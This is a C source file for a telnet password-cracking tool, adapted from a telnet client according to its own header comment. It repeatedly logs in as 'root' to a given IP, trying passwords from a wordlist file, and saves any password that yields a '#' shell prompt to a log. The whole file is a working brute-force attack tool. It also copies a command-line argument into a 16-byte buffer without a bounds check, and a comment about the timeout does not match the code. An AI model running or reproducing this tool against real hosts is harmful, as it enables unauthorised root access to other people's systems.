/*
 * I downloaded a telnet client,based on which I made a password craking tool.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/time.h>
#include <sys/types.h>

#include "common.h"
#include "telnet_client.h"
#include "redirect.h"

#include <time.h>	//Recoding time need this head file.

#define USER_BUF_SIZE	256


clock_t start,finish;
double	duration;
char	password[1024];

char *getPassword()
{
	static char filename[] = "password.txt";
	static FILE *fp;
	static char strLine[1024];
	static int start=0;
	if(!start)
	{
		if((fp = fopen(filename,"r"))==NULL)
		{
			printf("read file error!\n");
			exit(1);
			return NULL;
		}
		start=1;
	}

	if(feof(fp))
	{
		fclose(fp);
		printf("\nNo right password!\n");
		exit(1);
		return NULL;
	}

	fgets(strLine,1024,fp);
	strLine[strlen(strLine)-1]='\0';
	strcpy(password,strLine);
	return strLine;
}

void savePassword(char *IP)
{
	FILE*	stream;
	long	offset;
	fpos_t	pos;
	stream = fopen("password.log", "a");
	fseek(stream, 0, SEEK_END);

	fprintf(stream, "\nSave file:\nIP:%s\nAccount:%s\nPassword:%s\n\n", IP, "root", password);
	
	fclose(stream);
	
	printf("\nSave file:\nIP:%s\nAccount:%s\nPassword:%s\n\n",IP,"root",password);
	
}

int judge(char *data,char *send)
{
	if(strlen(data)){
		start=clock();//recode the start time
		if(strstr(data,"login:"))
			{ strcpy(send,"root");/* printf("key in account\n");*/ return strlen(send)+1;}
		if(strstr(data, "Password:"))
			{ strcpy(send,getPassword(send)); /*printf("key in password\n");*/ return strlen(send)+1; }
		if(strstr(data, "incorrect"))//Login incorrect
			{ printf("wrong password\n"); return -1;}
		if(strstr(data, "#"))
			{ printf("get in\n"); return -2; }
		return 0;
	}
	else {
		finish=clock();
		duration=(double)(finish-start)/CLOCKS_PER_SEC;
		if((int)(duration*1000)>100)//I will close connect if there is no reply within 1000ms
/*If you change the second 1000 above, you can get a different result!
 *If you change it into 5000, you will wait, until it tell you to retype, you will try 3 times, and then reconnect!If your network condition is bad, you'd better choose this.
 *If you change it into 1000, you will wait 1s at most, If there is no reply, you will disconnect and reconnect again! If your network condition is good,chose this one.
 *If you change it into <1000,you will scan the keyword very fast, but I'm not sure you will get the resule you want.ep:100*/
		{
			return -3;//close connection process
		}
	}
	return 0;
}

int main(int argc,char **argv)
{
	char server_ip[16];
	char user_buf[USER_BUF_SIZE];
	unsigned char msg_to_user[USER_BUF_SIZE];
	unsigned short server_port;
	int tel_fd,max_fd;
	int retval,n_read;
	fd_set readfd;
	struct timeval timeout;
	tel_ctrl tel_info;


	if(argc == 2){
		strcpy(server_ip,argv[1]);
		server_port = 23;
	}
	else if(argc == 3){
		strcpy(server_ip,argv[1]);
		server_port = atoi(argv[2]);
	}
	else{
		printf("Usage:%s server_ip [server_port]\n",argv[0]);
		return -1;
	}

	for(;;){
		telnet_init(&tel_info);
		retval = telnet_connect(server_ip,server_port,&tel_info);
		if(retval < 0){
			printf("failed connect\n");
			return -1;
		}
		printf("I am negotiating with server,please waiting......\n");

		tel_fd = tel_info.fd;
		timeout.tv_sec = 1;
		timeout.tv_usec = 0;
		FD_ZERO(&readfd);
		FD_SET(tel_fd,&readfd);
		max_fd = tel_fd;
		setlock(STD_IN,FALSE);
		n_read=1;
		strcpy(user_buf,"");
		printf("%d\n",tel_info.connected);
		printf("%s\n",user_buf);
		start=clock();
		while(tel_info.connected){
			//n_read = read(STD_IN,user_buf,USER_BUF_SIZE);
			if(n_read>0){
				user_buf[--n_read] = '\0';
				telnet_deal_cmd(user_buf,n_read,&tel_info);		
			}

			telnet_get(msg_to_user,&tel_info);
			n_read = judge((char *)msg_to_user,user_buf);
			if(n_read==-1)
			{}
			else if(n_read==-2)
			{ savePassword(server_ip); telnet_free(&tel_info); return 0; }
			else if(n_read==-3)
				break;
			output_to_user((char *)msg_to_user);
			fflush(stdout);
		}
		telnet_free(&tel_info);
	}
	return 0;	
}
